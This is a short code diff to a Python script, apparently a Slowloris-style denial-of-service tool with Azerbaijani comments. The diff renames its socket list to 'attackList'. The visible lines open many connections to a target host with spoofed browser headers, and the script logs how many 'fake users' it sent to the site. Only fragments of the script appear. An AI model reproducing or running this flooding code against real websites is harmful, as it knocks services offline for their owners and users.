@@ -4,7 +4,7 @@ printLog = 2
 def log(text, lvl=1):
     if printLog >= lvl:
         print(text)
-socketList = []
+attackList = []
 HTTPHeaders = [
     "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0", # asagida alternativler movcuddur ( 11-ci setir)
     "Accept-language: *" # asagida alternativler movcuddur ( 15-ci setir) 
@@ -30,5 +30,5 @@ for i in range(1,attackCount+1):
     except socket.error:
         log("{} user yeterlidir :)".format(i))
         break
-    socketList.append(s)
+    attackList.append(s)
 log("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
